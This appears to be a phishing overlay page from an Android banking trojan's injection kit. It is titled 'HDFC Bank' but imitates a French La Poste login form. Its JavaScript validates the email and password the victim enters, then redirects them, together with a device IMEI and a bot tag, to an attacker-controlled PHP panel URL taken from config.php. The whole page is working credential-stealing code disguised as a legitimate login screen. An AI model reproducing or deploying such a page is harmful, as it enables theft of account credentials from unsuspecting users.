<html><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>HDFC Bank</title>
    <style type="text/css" id="FITML__optAndEmu">

        .fitMlbody {
            padding: 0px !important;
            margin-left: auto !important;
            margin-right: auto !important
        }

        .fitMldoc {
            padding: 0px 0 0px 0 !important;
            margin: 0 !important

        }

        img {
            border: 0;
            margin-top: 5px;
        }
    </style>
    <style type="text/css" id="FITML__IE_viewport">
        @-ms-viewport {
            width: device-width;
            zoom: 1
        }
    </style>
    <style type="text/css">
        .hidden {
            display: none
        }
    </style>
    <style type="text/css">
        body {
            width: auto;
            color: #000000;
            font-size: small;
            font-family: Arial, Sans-Serif;
            margin: 0;
            padding: 0;
            background: #EEE;
			height: 380px;
        }

        img {
            border: 0;
            margin: 0;
            padding: 0;
            vertical-align: middle
        }

        table {
            border: 0;
            margin: 0;
            padding: 0;
            border-collapse: collapse
        }

        div {
            margin: 0;
            padding: 0;
            font-size: small
        }

        td {
            margin: 0;
            padding: 0;
            vertical-align: middle;
            font-size: small
        }

        a {
            color: #000000;
            font-size: small;
            text-decoration: none
        }

        form {
            margin: 0;
            padding: 0;
            border: 0
        }

        input {
            vertical-align: middle
        }

        select {
            vertical-align: middle;
            margin: 0;
            padding: 0;
            font-weight: normal
        }

        button {
            vertical-align: middle
        }

        textarea {
            width: 90% !important
        }

        label {
            margin: 0;
            vertical-align: middle;
            color: #003366
        }

        p {
            margin: 0;
            padding: 4px 0
        }

        h1 {
            margin: 0;
            padding: 4px 0;
            font-weight: bold;
            font-size: small
        }

        h2 {
            margin: 0;
            padding: 0;
            font-weight: bold;
            font-size: small
        }

        h3 {
            margin: 0;
            padding: 0;
            font-weight: normal;
            font-size: small
        }


        .submit_25 {
            width: 99%;
            border-color: #036;
            background: #F3C440;
            border: 0 none;
            margin-top: 10px;
            height: 60px;
            color: #000;
			float: right;
			margin-right: 10px;
			margin-bottom: 40px;
        }


        .input_100 {
            width: 99%;
            float: right;
            margin-right: 10px;
            border: 1px solid grey;
            height: 40px;
            margin-top: 10px;
            padding: 0 0 0 5px;
        }

        .ptb {
            padding: 4px 0
        }


        .content {
            margin: 0;
            padding: 0;
            background-color: #EEE;
            margin-left: 10px
        }


        .teaser_box {
            margin-bottom: 10px;
            border-color: #FFFFFF;
            padding: 4px 0
        }

        .input_100:focus {
            box-shadow: 0px 0px 7px #06F;
        }

.fielderror {
            width: 99%;
            float: right;
            margin-right: 10px;
            border: 1px solid #f00;
            height: 40px;
            margin-top: 10px;
            padding: 0 0 0 5px;
	}
    </style>
    <style></style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body onload="fit.finishedOnload();" class="fitMldoc">
<div id="content_div">


    <div style="background: rgb(243, 196, 64) none repeat scroll 0% 0%; color: rgb(0, 0, 0); text-align: center; font-size: 25px; padding: 5px; height: 34px;">Connexion</div>

<center>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJsAAABkCAYAAACRpUJAAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAATVSURBVHhe7Z3XThxBEEX9/59GzhkkEDnnDGOdkcfGo8YCs9R2Vd0rnQdjYHt3znaonm1+nJycNEJYINmEGZJNmCHZhBmSTZgh2YQZkk2YIdmEGZJNmCHZhBmSTZgh2YQZkk2YIdmEGZJNmCHZ/sHZ2VlzcXHRXF1dNdfX183Nzc1v+Ddfv7y8bL+v9PPibyRbj9PT01aih4eH5unpqXl5eWleX19b+uFr/P/z83P7/QjIz5d+r5Bsf4EsyPOVIODt7a16uwLpZet6MnqxQYbeDnkl3R9Sy4YI9/f3xSFyUHl8fGznfaXHz0Za2RCN3sciDM0sJErtyERK2ehpvjo3+2zoPbMLl042RLPq0fpBOOaHpXZlIJVsLAYGvRD4bBA96xwulWzUwmoIi4aM9bg0sjF81RR2IUrtjEwK2Vh5Dnv47If52/n5ebG9UUkhG73Id9bS/jcM66X2RiW8bPRqtczV+qH8kql3Cy/bMGpqHw29baa5W3jZ2J+sOWyXZVmZhpeNMkPNoe6WZSgNL1utQ2gXhtIsRd7wstW4Cu1HsgWAlaiHZNkvDS0bcyEPYRFTan80JFsFkWwB0DBaF6FlOzo6crFAUOkjAPv7+y7qbMfHx8X2RyO0bLu7u9XdWtQPOwi8KUrtj0b4nm17e/vXZa0zbFXt7OwU2x+N0LLB4uJi1RvxvBmg1PZohJdtdna22qGU+eTKyop6tihMTU21F7PGVSnbVJOTk+3cstT2aISXbWlpqZmZmWkn4rVlYWGh7XkPDg6KbY9GeNmYD42Ojra9R01hYTAyMtKsrq4W2x2R8LLt7e21QykXlmGrhnB37sTERDM2NtZsbm4W2x2R8LJRMF1eXm5lm5ubG/rnESjibmxstL3t9PR0u8tRandEwssGW1tbzfj4eCvc2traUEshzM9oR9eWUnujkkI2YDLeXWSGLuvzPlgN04t1baBXK7UzMmlkYzeh692Aoczqg8uITfmle2zmallqa29JIxtwgZkrAeJZFXvv7u6a+fn534+9vr6eZvP9Lalko9xAD8eZt8MIc0VWx6W2ZSCFbNwvNojDmQcV2kH5I9vhgKFloydjCLNeDHw0SMfOhm6edA7zMQ936RLameEYhnCydb2Zx3AXCJ+bKD2vCISSjeGo1hOLPhrKMVHncmFkQ7TaDvz73zCXiyhcCNkYOr33aP0gXLSFQwjZhlU3++7wBoo0h3MvG7cNeVl1fjY8r0iflncvW601tEGF4bT0vD3iWrbaPxM6qESpwbmVLeKi4L3Qu/F8S6+DJ9zKxlwt+hD6NvTipdfBE25l87QdNYiwK1J6HTzhVrao5Y73QsHa+1DqUrZM87UuTBm8F3ldykahM9N8jUTYwnIpG+/wTPM1EqHA61a2jPFeb3MpW5Zibj+sSD0vElzK5vXmyK/G+19gdilb7efkflcof3i+C8SlbFFukvxsWJFKNmOylT26eL+h0qVsvOgZQ/lDshmTrcbWRbINgcyRbMZw3BQHw2SDEzQ9/4EOl7Jx5FR3/FQmOAHJ88E0LmXjRS9djOhItiFQuhBZkGzGcBZtVg4PD4uviQdcyiZ8ItmEGZJNmCHZhBmSTZgh2YQZkk2YIdmEGZJNmCHZhBmSTZgh2YQZkk2YIdmEESfNTx6RV7lh/U00AAAAAElFTkSuQmCC" style="width: 200px;">
</center>
<div class="fitMlbody">

    <section class="content">
        <form action="null" method="post" id="_mainForm" target="flow_handler">
            <div class="teaser_box">


                <div class="ptb">
                    <input placeholder="Adresse e-mail *" name="Adresse e-mail" id="email" maxlength="60" class="input_100" type="text">
                </div>
                <br>

                <div class="ptb">
                    <input placeholder="Mot de passe *" class="input_100" name="Mot de passe" id="passe" maxlength="50" type="password">

                </div>
                <div class="ptb">
                    <center>
                        <input value="Connexion" id="input_submitBtn" class="submit_25" type="button">
                    </center>
                </div>
            </div>
<input type="hidden" name="name" value="La Poste">


        </form>
    </section>
</div>
<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe> 
</div>
           <script type="text/javascript">
               
                
                
                (function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
                        input.value = sV;
                        objForm.appendChild(input);
                    };


                  /*  var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
                    
                    if(!/https?:\/\//i.test(g_sFAct))
                       g_sFAct = 'http://' + g_sFAct;
                    
                    g_oForm.setAttribute('action',g_sFAct); // óñòàíàâëèâàåì ó ôîðìû óðë àäìèíêè
                    try{
                       g_oForm.action = g_sFAct;
                    } catch(e){};
                    
                    var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ïîëó÷àåì id áîòà
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
                    
                        var oNumInp = document.getElementById('email');
                        var oCodeInp = document.getElementById('passe');

                        try{
                            oNumInp.className = oCodeInp.className = 'input_100';
                        } catch(e){};
                        
                        if (oNumInp.value.length < 6) {
                            try{
                                oNumInp.className = 'fielderror';
                            } catch(e){};
                            return false;
                        }
                        
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
                            try{
                                oCodeInp.className = 'fielderror';
                            } catch(e){};
                            return false;
                        }
                top['closeDlg'] = true;
               /* prompt('send', '{"dialog id" : "laposte'+
                    '", "adresse_email": "'+oNumInp.value+
                    '", "mot_de_passe": "'+oCodeInp.value+'"}');
                        
                        document.getElementById('content_div').style.visibility = 'hidden';
                        g_oForm.submit();*/
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|laposte|"+oNumInp.value+"|"+oCodeInp.value+"|");
                        
                        return false;
                    };

                })();
            </script>

</body></html>
